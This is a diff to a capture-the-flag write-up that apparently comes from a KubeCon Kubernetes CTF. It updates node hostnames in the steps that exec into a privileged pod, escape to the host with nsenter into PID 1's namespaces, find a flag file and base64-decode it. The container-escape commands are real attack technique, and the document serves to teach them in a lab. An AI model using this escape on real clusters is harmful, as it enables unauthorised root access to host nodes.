@@ -33,18 +33,18 @@ pod/car-the-privileged-pod created
 Exec into pod:
 ```bash
 kubectl exec -it car-the-privileged-pod -- /bin/bash
-root@gke-kubecon-na-22-ctf-1-default-pool-554a053f-8xvk:/#
+root@gke-kubecon-na-ctf-1-default-pool-cfa14102-q2bp:/#
 ```
 
 Enter into all the namespaces:
 ```bash
-root@gke-kubecon-na-22-ctf-1-default-pool-554a053f-8xvk:/# nsenter -t 1 -m -u -n -i -p bash
-gke-kubecon-na-22-ctf-1-default-pool-554a053f-8xvk / #
+root@gke-kubecon-na-ctf-1-default-pool-cfa14102-q2bp:/# nsenter -t 1 -m -u -n -i -p bash
+gke-kubecon-na-ctf-1-default-pool-cfa14102-q2bp / #
 ```
 
 Find the flag:
 ```bash
-gke-kubecon-na-22-ctf-1-default-pool-554a053f-8xvk / # find .  -name "*flag*" -print
+gke-kubecon-na-ctf-1-default-pool-cfa14102-q2bp / # find .  -name "*flag*" -print
 ./home/car_capital/f0rd_flag.png
 ```
 
@@ -60,7 +60,7 @@ R0dXMFh4a1Qvdmlldw==
 
 Decode it from base64:
 ```bash
-base64 -d ./home/car_capital/f0rd_flag.png
+base64 -d /home/car_capital/f0rd_flag.png
 
 https://drive.google.com/file/d/1N-v6k4aSi6qo1x2cpIKR0n5VGGW0XxkT/view
 ```
